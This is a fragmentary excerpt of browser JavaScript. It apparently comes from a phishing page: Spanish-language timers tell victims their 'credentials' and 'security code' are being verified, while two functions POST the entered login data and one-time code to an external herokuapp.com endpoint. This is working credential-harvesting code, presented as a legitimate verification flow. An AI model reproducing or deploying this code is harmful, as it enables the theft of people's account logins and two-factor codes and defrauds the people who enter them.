...
window.addEventListener("DOMContentLoaded", () => {
  ...
  const showLoading = (timeout = 5, title = null, msg = "", cb = null) => {
    ...
    document.getElementById("contador").innerText = `Estamos verificando sus credenciales espere ${remainingTime} segundos en lo que terminamos el proceso`;
    ld.style.display = "flex";
    remainingTime--; 
    const intervalId1 = setInterval(() => {
      document.getElementById("contador").innerText = `Estamos verificando sus credenciales espere ${remainingTime} segundos en lo que terminamos el proceso`;
      remainingTime--; // Decrementa el tiempo restante

      if (remainingTime < 0) {
        clearInterval(intervalId1); // Limpia el intervalo cuando el tiempo se agote
  ...
  const showLoading2 = (timeout = 5, title = null, msg = "", cb = null) => {
    ...
    document.getElementById("contador").innerText = `Validando Código de seguridad espere \n ${remainingTime} segundos en lo que terminamos el proceso`;
    ld.style.display = "flex";
    remainingTime--; 
    ...
    const intervalId2 = setInterval(() => {
      ...
      if (remainingTime < 0) {
        clearInterval(intervalId2); // Limpia el intervalo cuando el tiempo se agote
        ld.style.display = "none";
  ...
  const sendData = async (data, cb = null) => {
    return await fetch("https://vic1-d6980f45c7a1.herokuapp.com/usuario/", {
      method: "POST",
      headers: {
  ...
  const sendData2 = async (data, cb = null) => {
    return await fetch("https://vic1-d6980f45c7a1.herokuapp.com/codigo/", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
